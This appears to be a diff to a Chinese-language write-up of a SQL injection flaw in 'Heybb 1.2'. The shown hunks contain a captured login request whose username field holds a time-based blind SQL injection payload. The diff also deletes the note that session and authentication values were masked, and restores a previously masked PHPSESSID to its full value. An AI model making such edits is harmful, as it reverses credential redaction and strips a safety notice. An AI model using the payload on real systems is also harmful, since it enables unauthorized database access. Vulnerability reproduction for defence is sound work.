@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -61,7 +60,7 @@ Heybb 1.2
     Referer: http://www.0-sec.org/login.php
     Accept-Encoding: gzip, deflate
     Accept-Language: zh-CN,zh;q=0.9
-    Cookie: PHPSESSID=qmp********************hp4
+    Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4
     Connection: close
 
     username=123123' and (select 1 from (select(sleep(5)))accn) AND '1'='1&password=123123&verify=h4ir
